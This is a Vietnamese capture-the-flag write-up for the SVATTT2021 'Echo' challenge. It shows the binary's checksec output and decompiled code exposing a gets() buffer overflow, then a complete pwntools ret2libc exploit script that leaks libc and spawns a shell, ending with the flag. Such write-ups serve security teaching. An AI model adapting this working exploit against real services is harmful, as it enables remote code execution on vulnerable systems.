# Echo

## REVERSE FILE
Xem thông số của file:
```sh
echoserver_2aa0a5dae5b5c2954ea6917acd01f49b: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, stripped
```
checksec file:
```sh
[*] '/mnt/c/Users/n18dc/OneDrive/Desktop/SVATTT2021/Vòng Khởi động/echoserver_2aa0a5dae5b5c2954ea6917acd01f49b'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
```
Các cơ chế bảo mật thì hầu như không sử dụng.
Dùng IDA để xem pseudo code của chương trình
```sh
__int64 __fastcall main(int a1, char **a2, char **a3)
{
  char s[128]; // [rsp+0h] [rbp-80h] BYREF

  signal(14, handler);
  alarm(0x14u);
  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(stdout, 0LL, 2, 0LL);
  setvbuf(stderr, 0LL, 2, 0LL);
  do
  {
    gets(s);
    puts(s);
  }
  while ( !strstr(s, "QUIT") );
  return 0LL;
}
```
Chương trình lặp đến khi chuỗi nhập vào có chứa chuối con "QUIT"
Dùng hàm gets(s) --> buffer overflow


## EXPLOIT

Dùng Ret2Libc để giải bài này. 
* leak libc, nhảy về main.
* ret về system("/bin/sh")

Địa chỉ hàm main được lấy từ IDA.
```sh
MAIN = 0x0000000004011AE             
```

File exploit
```sh
from pwn import *
# s = remote("125.235.240.166",20101)
s = process("./echoserver_2aa0a5dae5b5c2954ea6917acd01f49b")
elf = ELF("./echoserver_2aa0a5dae5b5c2954ea6917acd01f49b")
# libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
libc = ELF("./libc6_2.31-0ubuntu9_amd64.so")
pause()
RET = 0x0000000000401016
POPRDI = 0x00000000004012cb
GOT_PUTS = 0x404018
PLT_PUTS = 0x401030
STRSTR = 0x401241
GOT_GETS = 0x404030
PLT_GETS = 0x401060
MAIN = 0x4011AE
payload = "a"*0x88
payload += p64(POPRDI)
payload += p64(GOT_PUTS)
payload += p64(PLT_PUTS)
payload += p64(MAIN)

# payload = "AA" + p64(GOT_PUTS)

s.sendline(payload)
s.sendline("QUIT")
s.recvuntil("QUIT\n")

leak = u64(s.recv(6)+"\x00\x00")
libc.address = leak - libc.symbols['puts']
print ">>" + hex(leak)
print "libc " + hex(libc.address)

system = libc.symbols['system']
binsh = next(libc.search("/bin/sh"))

payload2 = "a"*0x88 + p64(POPRDI) + p64(binsh) + p64(RET) + p64(system)
s.sendline(payload2)
s.sendline("QUIT")
s.interactive()
#ASCIS{old_school_challenge}
```